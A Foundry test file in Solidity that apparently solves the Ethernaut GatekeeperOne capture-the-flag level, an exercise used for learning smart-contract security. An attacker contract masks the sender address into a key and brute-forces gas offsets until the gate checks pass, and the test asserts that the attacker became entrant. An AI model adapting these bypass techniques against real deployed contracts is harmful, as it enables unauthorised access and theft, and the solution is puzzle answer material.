// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/13_GatekeeperOne.sol";

contract GatekeeperOneAttacker{
    function attack(address _gatekeeperOneAddress) public{
            bytes8 key = bytes8(uint64(uint160(address(msg.sender)))) & 0xFFFFFFFF0000FFFF;

            console.log(gasleft());

    for(uint i = 0; i<300; i++){
    (bool success,) = _gatekeeperOneAddress.call{gas:i+(8191*3)}(abi.encodeWithSignature('enter(bytes8)', key));
    if(success)break;
    }
    }
}

contract GatekeeperOneTest is Test {
    GatekeeperOne _gatekeeperOne;
    address deployer;
    address attacker;

    function setUp() public {
        deployer = address(this);
        attacker = vm.addr(1);

        _gatekeeperOne = new GatekeeperOne();

    }

    function testSolution() public {
        vm.startPrank(attacker);

        new GatekeeperOneAttacker().attack(address(_gatekeeperOne));


        assertTrue(_gatekeeperOne.entrant() == attacker, "Attacker is not entrant!");
    }
}
